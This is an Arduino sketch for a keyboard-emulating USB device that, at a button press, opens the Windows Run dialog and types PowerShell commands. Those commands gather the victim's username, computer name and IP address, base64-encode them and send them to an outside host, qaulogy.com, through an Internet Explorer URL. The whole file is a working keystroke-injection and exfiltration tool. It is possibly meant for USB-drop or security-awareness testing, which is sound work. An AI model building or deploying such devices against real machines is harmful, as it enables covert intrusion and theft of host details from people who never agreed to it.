  #include <Keyboard.h>

int val = 0;    // variable
String MYID = "123";
int lightstart = 0;
bool button_press = false;

void setup() {
  Serial.begin(9600);      // open the serial port at 9600 bps:    
  pinMode(13, OUTPUT);     
  pinMode(8, INPUT);
  Keyboard.begin();
}

void betterPrintln(String line, int mydelay = 20, bool pressenter = false) {
        Serial.println("Keyboard emulating: " + line);
        Keyboard.println(line);
        if(pressenter) {
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();
        }
        delay(mydelay);  
}

void loop() {         
  val = digitalRead(8);
  if(val == HIGH && !button_press) {
      button_press = true;                                                        
      digitalWrite(13, HIGH);
  } else if (button_press && val == LOW) {
    Serial.write("Got a button press!");
      delay(100);
      val = digitalRead(8);
      if(val == LOW) {
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(50);
        Keyboard.releaseAll();
        delay(20);
        betterPrintln("powershell", 300, true);
        betterPrintln("$var = \" ducky" + MYID +";\" + $env:USERNAME + \" ;\" + $env:COMPUTERNAME + \" ;\" ;");
        betterPrintln("$ip = Test-Connection -ComputerName $env:COMPUTERNAME -Count 1  | Select IPV4Address ;");
        betterPrintln("$var += $ip.IPV4Address.IPAddressToString ;");
        betterPrintln("$var = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($var)) ;");
        betterPrintln("$var = $var.replace('B', '_') ;");
        betterPrintln("$IE=new-object -com internetexplorer.application ;");
        betterPrintln("$IE.navigate2(\" https://www.qaulogy.com/ducky/ducky/\" + $var) ;");
        betterPrintln("$IE.visible=$true ;", 30, true);
        betterPrintln("exit", 50, true);
        digitalWrite(13, LOW);
        button_press = false;
    }
  }
} 

